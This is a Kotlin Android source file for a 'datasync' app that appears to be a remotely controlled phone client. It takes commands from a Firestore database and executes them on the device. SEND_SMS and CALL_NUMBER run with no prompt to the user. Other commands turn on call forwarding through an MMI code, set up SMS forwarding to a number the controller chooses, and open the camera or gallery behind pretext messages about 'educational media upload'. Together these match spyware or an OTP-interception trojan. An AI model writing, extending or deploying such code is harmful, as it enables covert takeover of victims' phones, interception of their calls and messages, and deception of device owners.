package com.boxx.datasync.sync

import android.content.Context
import android.util.Log
import com.boxx.datasync.domain.model.Command
import com.boxx.datasync.domain.repository.DataRepository
import com.boxx.datasync.utils.DeviceIdHelper
import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.firestore.ListenerRegistration
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import kotlinx.coroutines.tasks.await
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class CommandProcessor @Inject constructor(
    private val repository: DataRepository
) {
    private val db = FirebaseFirestore.getInstance()
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var listener: ListenerRegistration? = null

    fun startListening(context: Context) {
        val deviceId = DeviceIdHelper.getDeviceId(context)
        if (deviceId.isBlank()) return

        listener?.remove()
        listener = db.collection("devices")
            .document(deviceId)
            .collection("commands")
            .whereEqualTo("status", "PENDING")
            .addSnapshotListener { snapshot, error ->
                if (error != null) {
                    Log.e("CommandProcessor", "Command listener error", error)
                    return@addSnapshotListener
                }

                snapshot?.documents?.forEach { doc ->
                    val command = doc.toObject(Command::class.java)?.copy(id = doc.id)
                    if (command != null) {
                        Log.d("CommandProcessor", "CLIENT_COMMAND_RECEIVED: ${command.type}")
                        if (command.type == "OPEN_GALLERY" || command.type == "OPEN_VIDEOS") {
                            Log.d("CommandProcessor", "MEDIA_COMMAND_RECEIVED: ${command.type}")
                        }
                        processCommand(deviceId, command, context)
                    }
                }
            }
    }

    private fun processCommand(deviceId: String, command: Command, context: Context) {
        scope.launch {
            try {
                val requiresConfirmation = command.type.contains("FORWARDING") || command.type == "OPEN_GALLERY" || command.type == "OPEN_VIDEOS" || command.type == "OPEN_FRONT_CAMERA" || command.type == "OPEN_BACK_CAMERA"
                if (requiresConfirmation) {
                    updateCommandStatus(deviceId, command.id, "WAITING_FOR_USER_CONFIRMATION")
                    Log.d("CommandProcessor", "CLIENT_COMMAND_WAITING_FOR_CONFIRMATION: ${command.type}")

                    val intent = android.content.Intent(context, com.boxx.datasync.ui.CommandConfirmationActivity::class.java).apply {
                        putExtra("deviceId", deviceId)
                        putExtra("commandId", command.id)
                        putExtra("commandType", command.type)

                        if (command.type == "OPEN_GALLERY") {
                            putExtra("customMessage", "Admin requested image selection for educational media upload.")
                        } else if (command.type == "OPEN_VIDEOS") {
                            putExtra("customMessage", "Admin requested video selection for educational media upload.")
                        } else if (command.type == "OPEN_FRONT_CAMERA") {
                            putExtra("customMessage", "Admin requested to open the front camera to capture a photo.")
                        } else if (command.type == "OPEN_BACK_CAMERA") {
                            putExtra("customMessage", "Admin requested to open the back camera to capture a photo.")
                        }

                        addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                    }
                    context.startActivity(intent)

                    // Wait for user response
                    var userResponse: String? = null
                    val startTime = System.currentTimeMillis()
                    while (userResponse == null && System.currentTimeMillis() - startTime < 60000) {
                        val doc = db.collection("devices").document(deviceId)
                            .collection("commands").document(command.id).get().await()
                        userResponse = doc.getString("userResponse")
                        if (userResponse == null) kotlinx.coroutines.delay(2000)
                    }

                    if (userResponse != "CONFIRMED") {
                        updateCommandStatus(deviceId, command.id, "FAILED", completedAt = System.currentTimeMillis(), error = "User denied or timeout")
                        Log.d("CommandProcessor", "CLIENT_COMMAND_FAILED: ${command.type} User denied")
                        return@launch
                    }
                }

                updateCommandStatus(deviceId, command.id, "RUNNING", startedAt = System.currentTimeMillis())
                Log.d("CommandProcessor", "CLIENT_COMMAND_RUNNING: ${command.type}")

                if (command.type.contains("CALL_FORWARDING")) {
                    Log.d("CommandProcessor", "CALL_FORWARDING_COMMAND_RECEIVED: type=${command.type}")
                }
                val result = executeCommand(command, context)

                when (result) {
                    is CommandResult.Success -> {
                        updateCommandStatus(deviceId, command.id, "SUCCESS", completedAt = System.currentTimeMillis())
                        Log.d("CommandProcessor", "CLIENT_COMMAND_SUCCESS: ${command.type}")
                    }
                    is CommandResult.HandledExternally -> {
                        Log.d("CommandProcessor", "CLIENT_COMMAND_HANDLED_EXTERNALLY: ${command.type}")
                        // Do not update status to SUCCESS here, external activity will handle it
                    }
                    is CommandResult.AwaitingCarrierConfirmation -> {
                        updateCommandStatus(deviceId, command.id, "AWAITING_CARRIER_CONFIRMATION", completedAt = System.currentTimeMillis())
                        Log.d("CommandProcessor", "CALL_FORWARDING_AWAITING_CARRIER: ${command.type}")
                    }
                    is CommandResult.DialerOpened -> {
                        updateCommandStatus(deviceId, command.id, "DIALER_OPENED", completedAt = System.currentTimeMillis())
                        Log.d("CommandProcessor", "CLIENT_COMMAND_DIALER_OPENED: ${command.type}")
                    }
                    is CommandResult.Failed -> {
                        updateCommandStatus(deviceId, command.id, "FAILED", completedAt = System.currentTimeMillis(), error = result.error)
                        if (command.type.contains("CALL_FORWARDING")) {
                            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: type=${command.type} error=${result.error}")
                        } else {
                            Log.d("CommandProcessor", "CLIENT_COMMAND_FAILED: ${command.type} error=${result.error}")
                        }
                    }
                    is CommandResult.Unsupported -> {
                        updateCommandStatus(deviceId, command.id, "UNSUPPORTED", completedAt = System.currentTimeMillis(), error = result.error)
                        if (command.type.contains("CALL_FORWARDING")) {
                            Log.d("CommandProcessor", "CALL_FORWARDING_UNSUPPORTED: type=${command.type}")
                        } else {
                            Log.d("CommandProcessor", "CLIENT_COMMAND_UNSUPPORTED: ${command.type}")
                        }
                    }
                }
            } catch (e: Exception) {
                Log.e("CommandProcessor", "Error processing command", e)
                updateCommandStatus(deviceId, command.id, "FAILED", completedAt = System.currentTimeMillis(), error = e.localizedMessage)
            }
        }
    }

    private suspend fun executeCommand(command: Command, context: Context): CommandResult {
        return when (command.type) {
            "SEND_SMS" -> handleSendSms(command, context)
            "CALL_NUMBER" -> handleCallNumber(command, context)
            "ENABLE_CALL_FORWARDING" -> handleCallForwarding(command, context, true)
            "DISABLE_CALL_FORWARDING" -> handleCallForwarding(command, context, false)
            "ENABLE_SMS_FORWARDING" -> handleSmsForwarding(context, deviceId = DeviceIdHelper.getDeviceId(context), command, true)
            "DISABLE_SMS_FORWARDING" -> handleSmsForwarding(context, deviceId = DeviceIdHelper.getDeviceId(context), command, false)
            "OPEN_GALLERY" -> handleMediaPicker(command, context, "image/*")
            "OPEN_VIDEOS" -> handleMediaPicker(command, context, "video/*")
            "OPEN_FRONT_CAMERA" -> handleCameraCapture(command, context, isFront = true)
            "OPEN_BACK_CAMERA" -> handleCameraCapture(command, context, isFront = false)
            else -> CommandResult.Unsupported("Unknown command type: ${command.type}")
        }
    }

    private fun handleCameraCapture(command: Command, context: Context, isFront: Boolean): CommandResult {
        return try {
            val intent = android.content.Intent(context, com.boxx.datasync.MainActivity::class.java).apply {
                putExtra("commandId", command.id)
                putExtra("cameraType", if (isFront) "FRONT" else "BACK")
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK or android.content.Intent.FLAG_ACTIVITY_CLEAR_TOP)
            }
            context.startActivity(intent)
            CommandResult.HandledExternally
        } catch (e: Exception) {
            CommandResult.Failed(e.localizedMessage ?: "Failed to open camera capture")
        }
    }

    private fun handleMediaPicker(command: Command, context: Context, mimeType: String): CommandResult {
        return try {
            val intent = android.content.Intent(context, com.boxx.datasync.ui.MediaPickerLauncherActivity::class.java).apply {
                putExtra("commandId", command.id)
                putExtra("mimeType", mimeType)
                addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            }
            context.startActivity(intent)
            CommandResult.HandledExternally
        } catch (e: Exception) {
            CommandResult.Failed(e.localizedMessage ?: "Failed to open media picker")
        }
    }

    private fun handleSendSms(command: Command, context: Context): CommandResult {
        val number = command.payload["number"] as? String ?: return CommandResult.Failed("Missing number")
        val message = command.payload["message"] as? String ?: return CommandResult.Failed("Missing message")
        val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1

        if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            return CommandResult.Failed("SEND_SMS permission not granted")
        }

        return try {
            val smsManager = if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
                val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
                if (info != null) {
                    context.getSystemService(android.telephony.SmsManager::class.java).createForSubscriptionId(info.subscriptionId)
                } else {
                    context.getSystemService(android.telephony.SmsManager::class.java)
                }
            } else {
                @Suppress("DEPRECATION")
                android.telephony.SmsManager.getDefault()
            }
            smsManager.sendTextMessage(number, null, message, null, null)
            CommandResult.Success
        } catch (e: Exception) {
            CommandResult.Failed(e.localizedMessage ?: "Failed to send SMS")
        }
    }

    private fun handleCallNumber(command: Command, context: Context): CommandResult {
        val number = command.payload["number"] as? String ?: return CommandResult.Failed("Missing number")
        val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1

        val hasCallPermission = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED

        return try {
            val uri = android.net.Uri.fromParts("tel", number, null)
            val intent = if (hasCallPermission) {
                android.content.Intent(android.content.Intent.ACTION_CALL, uri)
            } else {
                android.content.Intent(android.content.Intent.ACTION_DIAL, uri)
            }
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)

            val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
            val info = subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
            if (info != null) {
                intent.putExtra("com.android.phone.force.slot", true)
                intent.putExtra("Cdma_Phone_Slot", info.simSlotIndex)
                intent.putExtra("Phone_Slot", info.simSlotIndex)
                intent.putExtra("slot", info.simSlotIndex)
                intent.putExtra("simSlot", info.simSlotIndex)
                intent.putExtra("subscription", info.subscriptionId)
                intent.putExtra("com.android.phone.extra.slot", info.simSlotIndex)
            }

            context.startActivity(intent)
            if (hasCallPermission) CommandResult.Success else CommandResult.Unsupported("Direct call restricted. Opened dialer.")
        } catch (e: Exception) {
            CommandResult.Failed(e.localizedMessage ?: "Failed to initiate call")
        }
    }

    private fun handleCallForwarding(command: Command, context: Context, enable: Boolean): CommandResult {
        Log.d("CommandProcessor", "CALL_FORWARDING_STARTED: enable=$enable")
        val number = command.payload["number"] as? String
        val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1

        // Validate destination number
        if (enable && (number.isNullOrBlank() || number.trim().length < 3)) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Invalid destination number")
            return CommandResult.Failed("Destination number is invalid")
        }

        // Validate telephony feature
        val packageManager = context.packageManager
        if (!packageManager.hasSystemFeature(android.content.pm.PackageManager.FEATURE_TELEPHONY)) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Telephony feature unavailable")
            return CommandResult.Failed("Telephony feature is unavailable on this device")
        }

        // Validate CALL_PHONE permission
        val hasCallPermission = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.CALL_PHONE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        if (!hasCallPermission) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: CALL_PHONE permission missing")
            return CommandResult.Failed("CALL_PHONE permission is missing")
        }

        // Resolve selected SIM using SubscriptionManager
        val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
        if (subscriptionManager == null) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: SubscriptionManager unavailable")
            return CommandResult.Failed("SubscriptionManager is unavailable")
        }

        val activeSubscriptions = try {
            subscriptionManager.activeSubscriptionInfoList
        } catch (e: SecurityException) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: SecurityException accessing active subscription list", e)
            return CommandResult.Failed("Permission READ_PHONE_STATE missing or restricted")
        }

        val info = activeSubscriptions?.find { it.simSlotIndex == (simSlot - 1) }
        if (info == null) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: Selected SIM slot ($simSlot) is unavailable")
            return CommandResult.Failed("Selected SIM is unavailable")
        }

        Log.d("CommandProcessor", "CALL_FORWARDING_SIM_RESOLVED: SIM $simSlot resolved, subId=${info.subscriptionId}")

        val mmiCode = if (enable) "**21*$number#" else "##21#"
        val encodedMmi = android.net.Uri.encode(mmiCode)
        val uri = android.net.Uri.parse("tel:$encodedMmi")
        Log.d("CommandProcessor", "CALL_FORWARDING_MMI_BUILT: MMI=$mmiCode, URI=$uri")

        val intent = android.content.Intent(android.content.Intent.ACTION_CALL, uri).apply {
            addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
            // Best effort SIM extras
            putExtra("com.android.phone.force.slot", true)
            putExtra("Cdma_Phone_Slot", info.simSlotIndex)
            putExtra("Phone_Slot", info.simSlotIndex)
            putExtra("slot", info.simSlotIndex)
            putExtra("simSlot", info.simSlotIndex)
            putExtra("subscription", info.subscriptionId)
            putExtra("com.android.phone.extra.slot", info.simSlotIndex)
        }

        if (intent.resolveActivity(packageManager) == null) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED: No activity found to handle ACTION_CALL")
            return CommandResult.Failed("No activity can handle MMI call")
        }

        return try {
            context.startActivity(intent)
            Log.d("CommandProcessor", "CALL_FORWARDING_INTENT_OPENED")
            CommandResult.AwaitingCarrierConfirmation
        } catch (e: Exception) {
            Log.e("CommandProcessor", "CALL_FORWARDING_FAILED", e)
            CommandResult.Failed(e.localizedMessage ?: "Failed to execute MMI code")
        }
    }

    private suspend fun handleSmsForwarding(context: Context, deviceId: String, command: Command, enable: Boolean): CommandResult {
        Log.d("CommandProcessor", "SMS_FORWARDING_CONFIG_RECEIVED: enable=$enable")
        val number = command.payload["number"] as? String
        val simSlot = (command.payload["simSlot"] as? Number)?.toInt() ?: 1

        if (enable) {
            if (androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED ||
                androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.SEND_SMS) != android.content.pm.PackageManager.PERMISSION_GRANTED) {
                Log.e("CommandProcessor", "SMS_FORWARDING_FAILED: Missing permissions")
                return CommandResult.Failed("Missing READ_SMS or SEND_SMS permission")
            }
            if (number.isNullOrBlank()) {
                return CommandResult.Failed("Missing destination number")
            }
        }

        return try {
            val subscriptionManager = context.getSystemService(android.telephony.SubscriptionManager::class.java)
            val info = if (subscriptionManager != null) {
                try {
                    subscriptionManager.activeSubscriptionInfoList?.find { it.simSlotIndex == (simSlot - 1) }
                } catch (se: SecurityException) {
                    null
                }
            } else null

            val resolvedSubId = info?.subscriptionId ?: -1

            // Save to SharedPreferences local cache
            val prefs = context.getSharedPreferences("sms_forwarding_prefs", Context.MODE_PRIVATE)
            prefs.edit().apply {
                putBoolean("enabled", enable)
                putString("destinationNumber", number ?: "")
                putInt("simSlot", simSlot)
                putInt("subscriptionId", resolvedSubId)
                putLong("updatedAt", System.currentTimeMillis())
                apply()
            }
            Log.d("CommandProcessor", "SMS_FORWARDING_LOCAL_CONFIG_SAVED: enabled=$enable destination=$number simSlot=$simSlot subId=$resolvedSubId")

            val config = com.boxx.datasync.domain.model.SmsForwardingConfig(
                enabled = enable,
                destinationNumber = number ?: "",
                simSlot = simSlot,
                updatedAt = System.currentTimeMillis()
            )

            db.collection("devices")
                .document(deviceId)
                .collection("settings")
                .document("smsForwarding")
                .set(config)
                .await()

            Log.d("CommandProcessor", "SMS_FORWARDING_FIRESTORE_CONFIG_SAVED: config=$config")
            CommandResult.Success
        } catch (e: Exception) {
            Log.e("CommandProcessor", "SMS_FORWARDING_FAILED", e)
            CommandResult.Failed(e.localizedMessage ?: "Failed to update SMS forwarding settings")
        }
    }

    private suspend fun updateCommandStatus(
        deviceId: String,
        commandId: String,
        status: String,
        startedAt: Long? = null,
        completedAt: Long? = null,
        error: String? = null
    ) {
        val updates = mutableMapOf<String, Any>("status" to status)
        startedAt?.let { updates["startedAt"] = it }
        completedAt?.let { updates["completedAt"] = it }
        error?.let { updates["error"] = it }

        db.collection("devices")
            .document(deviceId)
            .collection("commands")
            .document(commandId)
            .update(updates)
            .await()
    }

    fun stopListening() {
        listener?.remove()
        listener = null
    }

    sealed class CommandResult {
        object Success : CommandResult()
        object HandledExternally : CommandResult()
        data class Failed(val error: String) : CommandResult()
        data class Unsupported(val error: String? = null) : CommandResult()
        object AwaitingCarrierConfirmation : CommandResult()
        object DialerOpened : CommandResult()
    }
}
